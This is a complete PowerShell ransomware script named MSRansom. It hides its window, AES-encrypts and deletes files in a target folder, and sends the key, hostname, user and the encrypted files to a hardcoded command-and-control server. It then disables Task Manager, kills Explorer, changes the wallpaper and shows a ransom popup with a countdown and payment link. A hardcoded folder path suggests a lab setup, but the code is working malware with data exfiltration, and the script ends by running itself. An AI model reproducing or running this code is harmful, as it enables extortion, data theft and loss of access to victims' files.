function MSRansom
{

# Design
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$OSVersion = [Environment]::OSVersion.Platform

# Hide PowerShell window for stealth
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

if ($OSVersion -like "*Win*") {
$Host.UI.RawUI.WindowTitle = "MSiRiG Ransomware Alert"
}



# Hardcoded Variables for Stealth Operation
$C2Server = "172.24.137.243"  # Hardcoded C2 Server IP
$C2Port = "7777"              # Hardcoded C2 Port
$Directory = "C:\Users\VMAdmin\Desktop\Hackme"  # Hardcoded target directory
$Mode = "-e"                  # Always encrypt mode
$Exfil = "-x"                 # Always exfiltrate
$PSRKey = $null               # Will be generated
$C2Status = $null
$Global:KeyCorrect = $false # Initialize Global:KeyCorrect

# Generate a unique payment ID for this session
$Global:UniquePaymentID = (New-Guid).ToString().Replace("-", "")

# Create target directory if it doesn't exist
if (!(Test-Path $Directory)) {
    New-Item -ItemType Directory -Path $Directory -Force | Out-Null
}

# Proxy Aware
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$AllProtocols = [System.Net.SecurityProtocolType]"Ssl3,Tls,Tls11,Tls12" ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols

# Functions
$computer = ([Environment]::MachineName).ToLower() ; $user = ([Environment]::UserName).ToLower() ; $Readme = "readme.txt"
$Time = Get-Date -Format "HH:mm - dd/MM/yy" ; $TMKey = $time.replace(":","").replace(" ","").replace("-","").replace("/","")+$computer
if ($OSVersion -like "*Win*") { $domain = (([Environment]::UserDomainName).ToLower()+"\") ; $slash = "\" } else { $domain = $null ; $slash = "/" }
$DirectoryTarget = $Directory.Split($slash)[-1] ; if (!$DirectoryTarget) { $DirectoryTarget = $Directory.Path.Split($slash)[-1] }

function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param(
        [Parameter(Mandatory = $true)]
        [ValidateSet("Encrypt", "Decrypt")]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path)

    Begin {
      $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
      $aesManaged = New-Object System.Security.Cryptography.AesManaged
      $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
      $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
      $aesManaged.BlockSize = 128
      $aesManaged.KeySize = 256
    }

    Process {
      $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
      switch ($Mode) {

          "Encrypt" {
              if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}

              if ($Path) {
                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                if (!$File.FullName) { break }
                $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                $outPath = $File.FullName + ".msirig"
              }

              $encryptor = $aesManaged.CreateEncryptor()
              $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
              $encryptedBytes = $aesManaged.IV + $encryptedBytes
              $aesManaged.Dispose()

              if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
              if ($Path) {
                [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
              }
          }

          "Decrypt" {
              if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}

              if ($Path) {
                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                if (!$File.FullName) { break }
                $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                $outPath = $File.FullName.replace(".msirig","")
              }

              $aesManaged.IV = $cipherBytes[0..15]
              $decryptor = $aesManaged.CreateDecryptor()
              $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
              $aesManaged.Dispose()

              if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
              if ($Path) {
                [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
              }
          }
      } # End of switch
    } # End of Process block

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
} # End of function Invoke-AESEncryption

# New function to set wallpaper
function Set-RansomWallpaper {
    Param(
        [Parameter(Mandatory=$true)]
        [string]$WallpaperUrl,
        [Parameter(Mandatory=$true)]
        [string]$DestinationPath
    )

    Try {
        Invoke-WebRequest -Uri $WallpaperUrl -OutFile $DestinationPath -ErrorAction Stop
        
        # Define constants for SystemParametersInfo
        $SPI_SETDESKWALLPAPER = 0x14 # 20
        $SPIF_UPDATEINIFILE = 0x01   # Write to Win.ini
        $SPIF_SENDCHANGE = 0x02      # Send WM_SETTINGCHANGE message

        # Add Type for P/Invoke to call SystemParametersInfo
        $signature = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
'@
        Add-Type -MemberDefinition $signature -Name "User32" -Namespace "Win32" -PassThru | Out-Null

        # Call SystemParametersInfo to set the wallpaper
        $result = [Win32.User32]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $DestinationPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
    }
    Catch {
        # Silent operation - no error messages
    }
}

# Function to save the current wallpaper path
function Save-OriginalWallpaper {
    Try {
        $regPath = "HKCU:\Control Panel\Desktop"
        $Global:OriginalWallpaperPath = (Get-ItemProperty -Path $regPath -Name Wallpaper -ErrorAction SilentlyContinue).Wallpaper
    }
    Catch {
        $Global:OriginalWallpaperPath = $null
    }
}

# Function to restore the original wallpaper
function Restore-OriginalWallpaper {
    Try {
        if ($null -ne $Global:OriginalWallpaperPath -and $Global:OriginalWallpaperPath -ne "") {
            $SPI_SETDESKWALLPAPER = 0x14
            $SPIF_UPDATEINIFILE = 0x01
            $SPIF_SENDCHANGE = 0x02
            
            # Ensure the type is available
            if (-not ([System.Management.Automation.PSTypeName]'Win32.User32').Type) {
                $signature = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
'@
                Add-Type -MemberDefinition $signature -Name "User32" -Namespace "Win32" -PassThru | Out-Null
            }
            
            [Win32.User32]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Global:OriginalWallpaperPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE) | Out-Null
        }
    }
    Catch {
        # Silent operation
    }
}

# New function to disable and restore explorer.exe auto-restart
function Disable-ExplorerAutoRestart {
    Param(
        [Parameter(Mandatory=$true)]
        [ValidateSet("Disable", "Restore")]
        [String]$Action
    )

    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $regName = "AutoRestartShell"
    
    if ($Action -eq "Disable") {
        Try {
            # Store the original value
            $script:originalAutoRestart = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
            Set-ItemProperty -Path $regPath -Name $regName -Value 0 -ErrorAction Stop
        }
        Catch {
            # Silent operation
        }
    }
    elseif ($Action -eq "Restore") {
        Try {
            if ($null -ne $script:originalAutoRestart) {
                Set-ItemProperty -Path $regPath -Name $regName -Value $script:originalAutoRestart -ErrorAction Stop
            } else {
                Set-ItemProperty -Path $regPath -Name $regName -Value 1 -ErrorAction Stop
            }
        }
        Catch {
            # Silent operation
        }
    }
}

# New function to disable and restore Task Manager
function Disable-TaskManager {
    Param(
        [Parameter(Mandatory=$true)]
        [ValidateSet("Disable", "Restore")]
        [String]$Action
    )

    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
    $regName = "DisableTaskMgr"
    
    if ($Action -eq "Disable") {
        Try {
            # Create the Policies\System key if it doesn't exist
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            # Store the original value
            $script:originalTaskMgr = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
            Set-ItemProperty -Path $regPath -Name $regName -Value 1 -ErrorAction Stop
        }
        Catch {
            # Silent operation
        }
    }
    elseif ($Action -eq "Restore") {
        Try {
            if ($null -ne $script:originalTaskMgr) {
                Set-ItemProperty -Path $regPath -Name $regName -Value $script:originalTaskMgr -ErrorAction Stop
            } else {
                Remove-ItemProperty -Path $regPath -Name $regName -ErrorAction Stop
            }
        }
        Catch {
            # Silent operation
        }
    }
}

# Modified function to kill explorer.exe with 3 beep sounds
function Stop-Explorer {
    Try {
        Stop-Process -Name "explorer" -Force -ErrorAction Stop
        # Play 3 beep sounds
        for ($i = 0; $i -lt 3; $i++) {
            [Console]::Beep(1000, 500)
            Start-Sleep -Milliseconds 200 # Short pause between beeps
        }
    }
    Catch {
        # Silent operation
    }
}

# Modified function to show ransom popup with 2 beep sounds
function PopUpRansom {
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[void] [System.Windows.Forms.Application]::EnableVisualStyles()

$shell = New-Object -ComObject "Shell.Application"
$shell.minimizeall()

# Create main form with larger size
$form = New-Object system.Windows.Forms.Form
$form.ControlBox = $false
$form.Size = New-Object System.Drawing.Size(800,600)
$form.BackColor = [System.Drawing.Color]::Black
$form.MaximizeBox = $false
$form.StartPosition = "CenterScreen"
$form.WindowState = "Normal"
$form.Topmost = $true
$form.FormBorderStyle = "FixedSingle"
$form.Text = "MSiRig Ransomware Alert"

# Create skull and crossbones ASCII art (simplified)
$skullLabel = New-Object System.Windows.Forms.Label
$skullLabel.ForeColor = [System.Drawing.Color]::Red
$skullLabel.BackColor = [System.Drawing.Color]::Black
$skullLabel.Text = @"
    ☠️ ALL YOUR FILES ARE ENCRYPTED! ☠️
   
    Your documents, photos, databases, and other
    important files have been encrypted with strong
    encryption. Without the decryption key,
    your files are inaccessible
    and will be LEAKED if payment is not received!.
"@
$skullLabel.Font = New-Object System.Drawing.Font("Consolas",14,[System.Drawing.FontStyle]::Bold)
$skullLabel.AutoSize = $false
$skullLabel.Size = New-Object System.Drawing.Size(760,180)
$skullLabel.Location = New-Object System.Drawing.Point(20,20)
$skullLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$form.Controls.Add($skullLabel)

# Instruction label
$instructionLabel = New-Object System.Windows.Forms.Label
$instructionLabel.ForeColor = [System.Drawing.Color]::White
$instructionLabel.BackColor = [System.Drawing.Color]::Black
$instructionLabel.Text = "To recover your files, you need to obtain the decryption key."
$instructionLabel.Font = New-Object System.Drawing.Font("Consolas",12,[System.Drawing.FontStyle]::Regular)
$instructionLabel.AutoSize = $false
$instructionLabel.Size = New-Object System.Drawing.Size(760,30)
$instructionLabel.Location = New-Object System.Drawing.Point(20,220)
$instructionLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$form.Controls.Add($instructionLabel)

# Timer label
$timerLabel = New-Object System.Windows.Forms.Label
$timerLabel.ForeColor = [System.Drawing.Color]::Yellow
$timerLabel.BackColor = [System.Drawing.Color]::Black
$timerLabel.Text = "Time remaining: 6 hours 00 minutes 00 seconds"
$timerLabel.Font = New-Object System.Drawing.Font("Consolas",12,[System.Drawing.FontStyle]::Bold)
$timerLabel.AutoSize = $false
$timerLabel.Size = New-Object System.Drawing.Size(760,30)
$timerLabel.Location = New-Object System.Drawing.Point(20,250)
$timerLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$form.Controls.Add($timerLabel)

# Key input textbox
$keyTextbox = New-Object System.Windows.Forms.TextBox
$keyTextbox.Location = New-Object System.Drawing.Point(150,290)
$keyTextbox.Size = New-Object System.Drawing.Size(500,30)
$keyTextbox.Font = New-Object System.Drawing.Font("Consolas",12)
$keyTextbox.BackColor = [System.Drawing.Color]::DarkGray
$keyTextbox.ForeColor = [System.Drawing.Color]::Black
$keyTextbox.TextAlign = [System.Windows.Forms.HorizontalAlignment]::Center
$form.Controls.Add($keyTextbox)

# Unlock button
$unlockButton = New-Object System.Windows.Forms.Button
$unlockButton.Location = New-Object System.Drawing.Point(330,330)
$unlockButton.Size = New-Object System.Drawing.Size(140,30)
$unlockButton.Text = 'DECRYPT FILES'
$unlockButton.ForeColor = [System.Drawing.Color]::White
$unlockButton.BackColor = [System.Drawing.Color]::DarkRed
$unlockButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$unlockButton.Font = New-Object System.Drawing.Font("Consolas",10,[System.Drawing.FontStyle]::Bold)
$unlockButton.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$form.Controls.Add($unlockButton)

# Status label
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.ForeColor = [System.Drawing.Color]::Yellow
$statusLabel.BackColor = [System.Drawing.Color]::Black
$statusLabel.Text = "Status: Waiting for decryption key or payment..."
$statusLabel.Font = New-Object System.Drawing.Font("Consolas",10,[System.Drawing.FontStyle]::Regular)
$statusLabel.AutoSize = $false
$statusLabel.Size = New-Object System.Drawing.Size(760,30)
$statusLabel.Location = New-Object System.Drawing.Point(20,370)
$statusLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$form.Controls.Add($statusLabel)

# PAY NOW button
$payButton = New-Object System.Windows.Forms.Button
$payButton.Location = New-Object System.Drawing.Point(330,430)
$payButton.Size = New-Object System.Drawing.Size(140,35)
$payButton.Text = 'PAY NOW'
$payButton.ForeColor = [System.Drawing.Color]::White
$payButton.BackColor = [System.Drawing.Color]::DarkGreen
$payButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$payButton.Font = New-Object System.Drawing.Font("Consolas",10,[System.Drawing.FontStyle]::Bold)
$payButton.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$form.Controls.Add($payButton)

# Timer logic for ransomware countdown
$deadline = (Get-Date).AddHours(6) # 6-hour countdown
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 1000 # Update every second
$timer.Add_Tick({
    $timeLeft = $deadline - (Get-Date)
    if ($timeLeft.TotalSeconds -gt 0) {
        $hours = [Math]::Floor($timeLeft.TotalHours)
        $minutes = $timeLeft.Minutes
        $seconds = $timeLeft.Seconds
        $timerLabel.Text = "Time remaining: $hours hours $minutes minutes $seconds seconds"
    } else {
        $timerLabel.Text = "Time expired! Files may be deleted or ransom doubled."
        $timerLabel.ForeColor = [System.Drawing.Color]::Red
        $timer.Stop()
    }
})

# Timer for delayed explorer.exe termination
$explorerTimer = New-Object System.Windows.Forms.Timer
$explorerTimer.Interval = 40000 # 40 seconds
$explorerTimer.Add_Tick({
    Disable-ExplorerAutoRestart -Action Disable
    Stop-Explorer
    $explorerTimer.Stop()
    $explorerTimer.Dispose()
})

# Event handlers
$unlockButton.add_Click({
    $enteredKey = $keyTextbox.Text
    if ($enteredKey -eq $PSRKey) {
        $statusLabel.Text = "Status: Decryption successful! Files are being restored."
        $statusLabel.ForeColor = [System.Drawing.Color]::Green
        $Global:KeyCorrect = $true
        $timer.Stop()
        $explorerTimer.Stop()
        # Restore the original wallpaper
        Restore-OriginalWallpaper
        # Create a timer to close the form after 2 seconds
        $closeTimer = New-Object System.Windows.Forms.Timer
        $closeTimer.Interval = 2000 # 2 seconds
        $closeTimer.Add_Tick({
            $form.Close()
            $closeTimer.Stop()
            $closeTimer.Dispose()
        })
        $closeTimer.Start()
    } else {
        $statusLabel.Text = "Status: Incorrect key! Files remain encrypted."
        $statusLabel.ForeColor = [System.Drawing.Color]::Red
        $Global:KeyCorrect = $false
    }
})

$payButton.add_Click({
    $paymentURL = "http://bitcoin.com/pay/$Global:UniquePaymentID"
    Start-Process $paymentURL # Open the URL in default browser
    $statusLabel.Text = "Status: Redirecting to payment portal... Please follow instructions on the new page."
    $statusLabel.ForeColor = [System.Drawing.Color]::Orange
    # The form does not close immediately, giving the impression of external action.
})

# Handle Enter key in textbox
$keyTextbox.add_KeyDown({
    if ($_.KeyCode -eq "Enter") {
        $unlockButton.PerformClick()
    }
})

# Cleanup on form close
$form.Add_Closing({
    $timer.Stop()
    $timer.Dispose()
    $explorerTimer.Stop()
    $explorerTimer.Dispose()
    Disable-ExplorerAutoRestart -Action Restore
    Disable-TaskManager -Action Restore
    # Restart explorer.exe
    Try {
        Start-Process explorer.exe -ErrorAction Stop
    }
    Catch {
        # Silent operation
    }
})

# Modified to add 2 beeps when the form is shown
$form.Add_Shown({
    $keyTextbox.Focus()
    # Play 2 beep sounds
    for ($i = 0; $i -lt 2; $i++) {
        [Console]::Beep(1000, 500)
        Start-Sleep -Milliseconds 200 # Short pause between beeps
    }
    # Start the ransomware countdown timer
    $timer.Start()
    # Disable Task Manager after popup is shown
    Disable-TaskManager -Action Disable
    # Start the explorer termination timer
    $explorerTimer.Start()
})

$result = $form.ShowDialog()

return $Global:KeyCorrect
}

function R64Encoder {
    if ($args[0] -eq "-t") { $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
    if ($args[0] -eq "-f") { $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
    $base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "-") ; $base64 = $base64.Replace("/", "_")
    $revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64 ; return $R64Base }



function GetStatus {
    Try { Invoke-WebRequest -useb "$C2Server`:$C2Port/status" -Method GET
      return $true } # Return true if C2 is up
    Catch { return $false }} # Return false if C2 is down

function SendResults {
    $DESKey = Invoke-AESEncryption -Mode Encrypt -Key $TMKey -Text $PSRKey ; $B64Key = R64Encoder -t $DESKey
    $C2Data = " [>] Key: $B64Key [>] Hostname: $computer [>] Current User: $domain$user [>] Current Time: $time"
    $RansomLogs = Get-Content "$Directory$slash$Readme" | Where-Object { $_ -match "\[\!\] .* is now encrypted" }
    $B64Data = R64Encoder -t $C2Data ; $B64Logs = R64Encoder -t ($RansomLogs -join "`n")
    Invoke-WebRequest -useb "$C2Server`:$C2Port/data" -Method POST -Body $B64Data 2>&1> $null
    Invoke-WebRequest -useb "$C2Server`:$C2Port/logs" -Method POST -Body $B64Logs 2>&1> $null }

function SendClose {
    Invoke-WebRequest -useb "$C2Server`:$C2Port/close" -Method GET 2>&1> $null }

function SendPay {
    Invoke-WebRequest -useb "$C2Server`:$C2Port/pay" -Method GET 2>&1> $null }

function SendOK {
    Invoke-WebRequest -useb "$C2Server`:$C2Port/done" -Method GET 2>&1> $null }

function CreateReadme {
    $ReadmeTXT = @"
All your files have been encrypted by MSiRig Ransomware! To recover them, you need the unique decryption key. If you are seeing this, your files are encrypted.

A. To obtain the decryption key, visit our payment portal: http://bitcoin.com/pay/$Global:UniquePaymentID

B. Your unique ID for payment: $Global:UniquePaymentID

C. Warning: Attempting to decrypt files with third-party tools may lead to irreversible data loss.

Failure to pay the ransom within 6 hours may result in permanent file deletion or a doubled ransom amount. We possess copies of sensitive data. Failure to pay could lead to its public release. 

Don't waste time, your data is at risk. Act quickly!"

D. Files Encrypted:
"@
    if (!(Test-Path "$Directory$slash$Readme")) {
        Add-Content -Path "$Directory$slash$Readme" -Value $ReadmeTXT
    }
}

function EncryptFiles {
    $ExcludedFiles = '*.msirig', 'readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
    foreach ($i in $(Get-ChildItem $Directory -recurse -exclude $ExcludedFiles | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
    Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i ; Add-Content -Path "$Directory$slash$Readme" -Value "[!] $i is now encrypted" ; Remove-Item $i }
    $RansomLogs = Get-Content "$Directory$slash$Readme" | Where-Object { $_ -match "\[\!\] .* is now encrypted" } ; if (!$RansomLogs) {
    Add-Content -Path "$Directory$slash$Readme" -Value "[!] No files have been encrypted!" }}

function ExfiltrateFiles {
    Invoke-WebRequest -useb "$C2Server`:$C2Port/files" -Method GET 2>&1> $null
    $RansomLogs = Get-Content "$Directory$slash$Readme" | Where-Object { $_ -match "\[\!\] No files have been encrypted!" } ; if (!$RansomLogs) {
    foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.msirig | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile
      Invoke-WebRequest -useb "$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
    else { $B64Name = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}

function DecryptFiles {
    foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.msirig | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $i
      Remove-Item $i }
    Remove-Item "$Directory$slash$Readme" -ErrorAction SilentlyContinue }

function CheckFiles {
    $RFiles = Get-ChildItem $Directory -recurse -filter *.msirig
    if ($RFiles) { $RFiles | Remove-Item } }

# Main - Stealth Execution
# Always run in attack mode with popup
$C2Status = GetStatus
$PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})

CreateReadme
EncryptFiles
if ($C2Status) { SendResults }

# Save original wallpaper before changing it
Save-OriginalWallpaper

# Set ransomware wallpaper
$wallpaperUrl = "https://raw.githubusercontent.com/IAMinZoho/MSRansom/refs/heads/main/Attack_Wallpaper.jpg"
$wallpaperTempPath = Join-Path $env:TEMP "ransom_wallpaper_$Global:UniquePaymentID.jpg"
Set-RansomWallpaper -WallpaperUrl $wallpaperUrl -DestinationPath $wallpaperTempPath

# Exfiltrate files if C2 is available
if ($Exfil -eq "-x" -and $C2Status) {
    ExfiltrateFiles
}

# Show ransomware popup
$unlockResult = PopUpRansom
if ($unlockResult) {
    DecryptFiles
    SendOK
} else {
    SendClose
    SendOK
}

}

# Execute the ransomware function
MSRansom

